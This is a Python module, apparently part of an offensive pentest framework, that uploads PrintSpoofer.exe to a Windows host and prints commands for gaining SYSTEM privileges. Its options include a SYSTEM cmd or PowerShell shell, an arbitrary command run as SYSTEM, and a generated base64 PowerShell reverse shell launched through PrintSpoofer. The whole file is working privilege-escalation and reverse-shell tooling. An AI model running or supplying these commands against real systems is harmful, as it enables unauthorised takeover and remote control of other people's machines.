PROVIDES = []
REQUIRES = []


def run(data, cred, args):

    from modules.upload.windows import stage_windows_files
    from core.paths import get_tools_dir
    from core.runner import run_module_by_name

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'

    #
    # ----------------------------------------------------------
    # Upload
    # ----------------------------------------------------------
    #

    print(
        f"\n{B}[?]{W} Transfer PrintSpoofer?\n"
    )

    print(
        f"  {B}[1]{W} Yes"
    )

    print(
        f"  {B}[2]{W} No\n"
    )

    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    if choice == "1":

        windows_tools = (
            get_tools_dir() /
            "windows"
        )

        stage_windows_files(
        [
            windows_tools / "PrintSpoofer.exe",
        ],
        data=data,
    )

    #
    # ----------------------------------------------------------
    # Menu
    # ----------------------------------------------------------
    #

    print()

    print(
        f"{B}┌── PRINTSPOOFER ─────────────────────┐{W}"
    )

    print(
        f"  {B}[1]{W} SYSTEM CMD"
    )

    print(
        f"  {B}[2]{W} Reverse Shell"
    )

    print(
        f"  {B}[3]{W} Custom Command"
    )

    print(
        f"  {B}[4]{W} Reference\n"
    )

    mode = input(
        f"{Y}Select> {W}"
    ).strip()

    #
    # ----------------------------------------------------------
    # SYSTEM
    # ----------------------------------------------------------
    #

    if mode == "1":

        print()

        print(
            f"{G}[+] Check privileges{W}\n"
        )

        print(
            f"{Y}whoami /priv{W}\n"
        )

        print(
            f"{G}[+] Launch SYSTEM shell{W}\n"
        )

        print(
            f"{Y}PrintSpoofer.exe -i -c cmd.exe{W}\n"
        )

        return

    #
    # ----------------------------------------------------------
    # REVERSE SHELL
    # ----------------------------------------------------------
    #

    if mode == "2":

        print()

        print(
            f"{B}[*]{W} Generating PowerShell reverse shell...\n"
        )

        result = run_module_by_name(
            "shell.generate",
            [
                "windows/powershell/reverse",
                "--base64",
                "--format",
                "raw",
            ],
            data
        )

        payload = None

        try:

            payload = result[0]["data"]["payload"]

        except Exception:

            pass

        if not payload:

            print(
                f"{R}[!] Failed to generate payload.{W}\n"
            )

            return

        print()

        print(
            f"{G}[+] Check privileges{W}\n"
        )

        print(
            f"{Y}whoami /priv{W}\n"
        )

        print(
            f"{G}[+] Execute{W}\n"
        )

        print(
            f'{Y}PrintSpoofer.exe -c "{payload}"{W}\n'
        )

        return

    #
    # ----------------------------------------------------------
    # CUSTOM
    # ----------------------------------------------------------
    #

    if mode == "3":

        command = input(
            f"{Y}Command> {W}"
        ).strip()

        if not command:
            return

        print()

        print(
            f"{G}[+] Execute{W}\n"
        )

        print(
            f'{Y}PrintSpoofer.exe -c "{command}"{W}\n'
        )

        return

    #
    # ----------------------------------------------------------
    # REFERENCE
    # ----------------------------------------------------------
    #

    print()

    print(
        f"{G}[+] Check privileges{W}\n"
    )

    print(
        f"{Y}whoami /priv{W}\n"
    )

    print(
        f"{G}[+] SYSTEM shell{W}\n"
    )

    print(
        f"{Y}PrintSpoofer.exe -i -c cmd.exe{W}\n"
    )

    print()

    print(
        f"{G}[+] SYSTEM PowerShell{W}\n"
    )

    print(
        f"{Y}PrintSpoofer.exe -i -c powershell.exe{W}\n"
    )

    print()

    print(
        f"{G}[+] Reverse shell{W}\n"
    )

    print(
        f'{Y}PrintSpoofer.exe -c "powershell -nop -enc <BASE64>"{W}\n'
    )
